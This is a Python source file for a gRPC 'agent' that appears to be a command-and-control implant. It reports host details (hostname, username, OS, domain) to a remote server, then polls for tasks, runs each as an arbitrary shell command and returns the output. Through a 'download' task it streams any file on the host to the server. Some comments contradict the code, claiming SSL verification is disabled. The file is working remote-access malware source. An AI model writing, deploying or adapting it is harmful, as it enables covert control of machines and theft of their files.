import grpc
import platform
import uuid
import os
import socket
import time
import subprocess
from datetime import datetime
import argparse
import sys
from pathlib import Path
import ssl

# Add the parent directory to sys.path so we can import the protos package
sys.path.append(str(Path(__file__).parent.parent))

from protos import agent_pb2
from protos import agent_pb2_grpc

class Agent:
    def __init__(self, server_address):
        self.server_address = server_address
        self.agent_id = str(uuid.uuid4())
        
        # Create insecure channel credentials
        options = [
            ('grpc.keepalive_time_ms', 10000),
            ('grpc.keepalive_timeout_ms', 5000),
            ('grpc.keepalive_permit_without_calls', True),
            ('grpc.http2.max_pings_without_data', 0),
            ('grpc.http2.min_time_between_pings_ms', 10000),
            ('grpc.http2.min_ping_interval_without_data_ms', 5000),
        ]
        
        # Create channel with SSL verification disabled
        credentials = grpc.ssl_channel_credentials()
        channel_options = (('grpc.ssl_target_name_override', 'merlin.rahulr.in'),)
        
        # Create composite channel credentials
        self.channel = grpc.secure_channel(
            server_address,
            credentials,
            options + channel_options
        )
        
        self.stub = agent_pb2_grpc.AgentServiceStub(self.channel)
        
    def get_system_info(self):
        return agent_pb2.SystemInfo(
            hostname=socket.gethostname(),
            username=os.getenv('USERNAME') or os.getenv('USER'),
            os=platform.system(),
            arch=platform.machine(),
            pid=str(os.getpid()),
            domain=socket.getfqdn(),
            agent_id=self.agent_id
        )
        
    def register(self):
        try:
            response = self.stub.Register(self.get_system_info())
            print(f"Registration: {response.message}")
            return response.success
        except grpc.RpcError as e:
            print(f"Failed to register: {e}")
            return False
        
    def checkin(self):
        try:
            request = agent_pb2.CheckinRequest(agent_id=self.agent_id)
            response = self.stub.Checkin(request)
            return response.has_tasks
        except grpc.RpcError as e:
            print(f"Checkin failed: {e}")
            return False
        
    def get_tasks(self):
        try:
            request = agent_pb2.TaskRequest(agent_id=self.agent_id)
            response = self.stub.GetTasks(request)
            return response.tasks
        except grpc.RpcError as e:
            print(f"Failed to get tasks: {e}")
            return []
        
    def execute_command(self, command):
        try:
            # Handle download command
            if command.startswith('download '):
                file_path = command.split(maxsplit=1)[1]
                success, message = self.send_file(file_path)
                if success:
                    return True, f"File transfer successful: {message}"
                else:
                    return False, f"File transfer failed: {message}"
            
            # Handle other commands
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                return True, stdout
            else:
                return False, stderr
        except Exception as e:
            return False, str(e)
        
    def send_result(self, task_id, success, output):
        try:
            result = agent_pb2.TaskResult(
                task_id=task_id,
                output=output,
                status="success" if success else "error",
                error=None if success else output,
                agent_id=self.agent_id
            )
            response = self.stub.SendResult(result)
            return response.success
        except grpc.RpcError as e:
            print(f"Failed to send result: {e}")
            return False
        
    def send_file(self, file_path: str, chunk_size=1024*1024):  # 1MB chunks
        try:
            file_path = os.path.expanduser(file_path)
            if not os.path.exists(file_path):
                return False, f"File not found: {file_path}"
            
            file_id = str(uuid.uuid4())
            file_name = os.path.basename(file_path)
            
            def chunk_generator():
                with open(file_path, 'rb') as f:
                    while True:
                        chunk = f.read(chunk_size)
                        if not chunk:
                            # Send last chunk
                            yield agent_pb2.FileChunk(
                                file_id=file_id,
                                file_name=file_name,
                                content=b'',
                                is_last=True,
                                agent_id=self.agent_id
                            )
                            break
                        yield agent_pb2.FileChunk(
                            file_id=file_id,
                            file_name=file_name,
                            content=chunk,
                            is_last=False,
                            agent_id=self.agent_id
                        )
            
            response = self.stub.SendFile(chunk_generator())
            return True, response.message
        except Exception as e:
            return False, str(e)
        
    def run(self):
        if not self.register():
            print("Failed to register with server")
            return
        
        print(f"Agent registered successfully with ID: {self.agent_id}")
        
        while True:
            try:
                if self.checkin():
                    tasks = self.get_tasks()
                    for task in tasks:
                        print(f"Executing task {task.id}: {task.command}")
                        success, output = self.execute_command(task.command)
                        self.send_result(task.id, success, output)
                
                time.sleep(5)  # Wait 5 seconds before next checkin
            except KeyboardInterrupt:
                print("\nAgent shutting down...")
                break
            except Exception as e:
                print(f"Error: {e}")
                time.sleep(10)  # Wait longer on error
        
def main():
    parser = argparse.ArgumentParser(description='GRPC Agent')
    parser.add_argument('--server', default='localhost:50051',
                        help='The server address in format host:port')
    args = parser.parse_args()
    
    agent = Agent(args.server)
    agent.run()
    
if __name__ == '__main__':
    main() 














